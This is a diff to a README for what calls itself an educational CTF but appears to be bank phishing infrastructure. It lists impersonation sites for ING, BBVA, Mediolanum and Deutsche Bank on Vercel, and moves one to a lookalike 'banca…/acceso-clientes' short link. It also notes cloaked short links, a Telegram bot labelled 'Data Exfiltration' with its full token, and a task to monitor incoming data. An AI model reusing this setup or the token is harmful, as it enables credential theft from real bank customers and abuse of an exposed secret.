@@ -5,14 +5,14 @@ This repository contains the configuration and state for a CTF focused on educat
 ## Current State (as of 2026-05-08)
 
 ### Active Sites (Vercel)
-- **ING**: [vercel-ing.vercel.app](https://vercel-ing.vercel.app)
+- **ING**: [banca.short.gy/acceso-clientes](https://banca.short.gy/acceso-clientes) (Updated domain)
 - **BBVA**: [vercel-bbva.vercel.app](https://vercel-bbva.vercel.app)
 - **Mediolanum**: [vercel-mediolanum.vercel.app](https://vercel-mediolanum.vercel.app)
 - **Deutsche Bank**: [vercel-deutschebank.vercel.app](https://vercel-deutschebank.vercel.app)
 
 ### Infrastructure Components
 - **Hosting**: Vercel
-- **Link Management**: Short.io (with cloaking)
+- **Link Management**: Short.io (Domain: banca.short.gy)
 - **Data Exfiltration**: Telegram Bot (`8658543489:AAHTAbGfWiw83B-FJ83bDapipV7SYh58M14`)
 - **Tunnels**: Cloudflare (used for local development/testing)
 
@@ -27,5 +27,5 @@ See `config.json` for API keys and tokens.
 
 ## Pending Tasks
 - [ ] Recover source code for all banks (previous links expired).
-- [ ] Update Short.io links if Vercel deployments change.
+- [ ] Update remaining Short.io links for other banks on the new domain.
 - [ ] Monitor Telegram bot for incoming data.
